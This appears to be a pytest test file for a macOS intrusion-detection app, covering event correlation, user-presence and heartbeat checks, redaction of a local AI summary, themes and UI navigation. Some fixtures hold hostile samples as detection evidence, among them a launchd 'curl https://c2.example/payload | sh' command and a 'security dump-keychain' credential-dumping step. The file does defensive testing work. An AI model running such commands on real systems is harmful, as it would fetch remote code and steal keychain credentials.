from __future__ import annotations

import os
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from PySide6.QtWidgets import QApplication

from mac_audit_agent.intrusion_correlation import IntrusionCorrelationEngine
from mac_audit_agent.models import BackgroundMonitorEvent
from mac_audit_agent.storage import AuditDatabase
from mac_audit_agent.themes import DEFAULT_THEME_NAME, theme_for_name, theme_stylesheet
from mac_audit_agent.themes import theme_names
from mac_audit_agent.ui.main_window import MainWindow


def _event(event_id: str, timestamp: str, event_type: str, severity: str, evidence: str, *, source: str = "test") -> BackgroundMonitorEvent:
    return BackgroundMonitorEvent(
        event_id=event_id,
        timestamp=timestamp,
        event_type=event_type,  # type: ignore[arg-type]
        severity=severity,  # type: ignore[arg-type]
        source=source,
        evidence=evidence,
        confidence="high",
        recommendation="review",
        metadata_json="{}",
        rule_id=event_type,
        trigger_rule_id=event_type,
        rule_name=event_type,
        trigger_rule_name=event_type,
    )


def test_intrusion_pattern_generated_from_related_events(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(_event("e-1", "2026-06-01T12:00:00+00:00", "screen_unlocked", "high", "Screen unlocked."))
    db.record_background_monitor_event(_event("e-2", "2026-06-01T12:02:00+00:00", "usb_device_connected", "medium", "USB keyboard connected."))
    engine = IntrusionCorrelationEngine(db)
    report = engine.build_report()
    assert report.patterns
    assert any(pattern.pattern_id == "physical_access_usb_activity" for pattern in report.patterns)
    assert report.user_presence.state in {"present_likely", "unknown", "suspicious_activity_window"}


def test_unrelated_events_do_not_create_false_pattern(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(_event("e-1", "2026-06-01T12:00:00+00:00", "camera_activity_stopped", "info", "Camera stopped."))
    engine = IntrusionCorrelationEngine(db)
    report = engine.build_report()
    assert report.patterns == []


def test_user_presence_confidence_marks_suspicious_window(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(_event("e-1", "2026-06-01T09:00:00+00:00", "input_activity_idle_started", "info", "Idle started."))
    db.record_background_monitor_event(_event("e-2", "2026-06-01T11:30:00+00:00", "input_activity_resumed_after_idle", "medium", "Keyboard used after long idle."))
    engine = IntrusionCorrelationEngine(db)
    report = engine.build_report()
    assert report.user_presence is not None
    assert report.user_presence.state == "suspicious_activity_window"
    assert report.user_presence.idle_minutes >= 120


def test_monitoring_coverage_detects_stale_heartbeat(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.set_background_monitor_state("running", "1")
    db.set_background_monitor_state("loaded", "1")
    db.set_background_monitor_state("last_heartbeat", "2026-06-01T00:00:00+00:00")
    db.set_background_monitor_state("detector_last_run_timestamp", "2026-06-01T00:00:00+00:00")
    db.set_background_monitor_state("notification_status", "ok")
    engine = IntrusionCorrelationEngine(db)
    report = engine.build_report()
    assert report.coverage is not None
    assert report.coverage.score < 100
    assert any("heartbeat" in item.lower() for item in report.coverage.missing)


def test_ai_summary_is_local_and_redacted(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(_event("e-1", "2026-06-01T12:00:00+00:00", "new_network_connection_detected", "medium", "user=alice connected from 192.168.1.50"))
    engine = IntrusionCorrelationEngine(db)
    report = engine.build_report()
    ai_summary = report.ai_summary
    assert ai_summary["local_only"] is True
    assert "[IP REDACTED]" in ai_summary["event_timeline"][0]["summary"]
    assert "192.168.1.50" not in ai_summary["event_timeline"][0]["summary"]
    assert "alice" not in ai_summary["event_timeline"][0]["summary"]


def test_mitre_attack_launchd_scripted_c2_fingerprint(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(
        _event(
            "e-1",
            "2026-06-01T12:00:00+00:00",
            "launchdaemon_added",
            "critical",
            "launchd plist RunAtLoad executes bash -c curl https://c2.example/payload | sh",
        )
    )
    db.record_background_monitor_event(
        _event("e-2", "2026-06-01T12:01:00+00:00", "new_network_connection_detected", "high", "outbound command and control beacon over https")
    )

    report = IntrusionCorrelationEngine(db).build_report()
    pattern = next(item for item in report.patterns if item.pattern_id == "attack_launchd_scripted_c2")

    assert pattern.severity == "critical"
    assert pattern.confidence == "high"
    assert "T1543.004" in pattern.source_trace
    assert "T1105" in pattern.source_trace


def test_mitre_attack_credential_access_persistence_fingerprint(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(
        _event(
            "e-1",
            "2026-06-01T12:00:00+00:00",
            "execution_evidence_detected",
            "critical",
            "security dump-keychain observed before zip archive staging",
        )
    )
    db.record_background_monitor_event(
        _event("e-2", "2026-06-01T12:03:00+00:00", "launchagent_added", "high", "LaunchAgent persistence RunAtLoad uses osascript")
    )

    report = IntrusionCorrelationEngine(db).build_report()
    pattern_ids = {item.pattern_id for item in report.patterns}

    assert "attack_credential_access_persistence" in pattern_ids
    pattern = next(item for item in report.patterns if item.pattern_id == "attack_credential_access_persistence")
    assert "T1555.001" in pattern.source_trace


def test_mitre_attack_defense_evasion_blindness_fingerprint(tmp_path: Path) -> None:
    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
    db.record_background_monitor_event(
        _event(
            "e-1",
            "2026-06-01T12:00:00+00:00",
            "protected_monitor_tamper_detected",
            "critical",
            "root tamper disabled monitor heartbeat and stopped detector",
        )
    )
    db.record_background_monitor_event(
        _event(
            "e-2",
            "2026-06-01T12:02:00+00:00",
            "execution_evidence_detected",
            "critical",
            "unsigned temp shell execution with launchdaemon persistence",
        )
    )

    report = IntrusionCorrelationEngine(db).build_report()
    pattern = next(item for item in report.patterns if item.pattern_id == "attack_defense_evasion_blindness")

    assert pattern.severity == "critical"
    assert pattern.confidence == "high"
    assert "T1562" in pattern.source_trace


def test_theme_registry_and_stylesheet() -> None:
    assert theme_for_name("does-not-exist").name == DEFAULT_THEME_NAME
    stylesheet = theme_stylesheet(theme_for_name("High Contrast"), accessibility_override=True)
    assert "#FFFFFF" in stylesheet
    assert "#FF4D5A" in stylesheet


def test_all_skins_have_visible_scrollbar_styles() -> None:
    for name in theme_names():
        stylesheet = theme_stylesheet(theme_for_name(name), accessibility_override=name == "High Contrast")
        assert "QScrollBar:vertical" in stylesheet
        assert "width: 18px" in stylesheet
        assert "QScrollBar::handle:vertical" in stylesheet
        assert "#FFD166" in stylesheet


def test_theme_switching_persists(tmp_path: Path) -> None:
    app = QApplication.instance() or QApplication([])
    db_path = tmp_path / "audit.sqlite"
    window = MainWindow(db_path)
    window.apply_theme_choice("Matrix Green", True)
    assert window.db.get_background_monitor_state("selected_theme") == "Matrix Green"
    assert window.db.get_background_monitor_state("accessibility_high_contrast") == "1"
    window.close()
    reopened = MainWindow(db_path)
    assert reopened.db.get_background_monitor_state("selected_theme") == "Matrix Green"
    assert reopened.db.get_background_monitor_state("accessibility_high_contrast") == "1"
    reopened.close()
    app.processEvents()


def test_main_navigation_includes_new_pages(tmp_path: Path) -> None:
    app = QApplication.instance() or QApplication([])
    window = MainWindow(tmp_path / "audit.sqlite")
    items = [window.sidebar.item(index).text() for index in range(window.sidebar.count())]
    assert "Intrusion Detection" in items
    assert "Flight Recorder" in items
    assert "Skins" in items
    assert hasattr(window, "operational_health_panel")
    assert hasattr(window, "intrusion_detection_panel")
    assert hasattr(window, "flight_recorder_panel")
    assert hasattr(window, "logs_panel")
    assert hasattr(window, "theme_panel")
    window.close()
    app.processEvents()
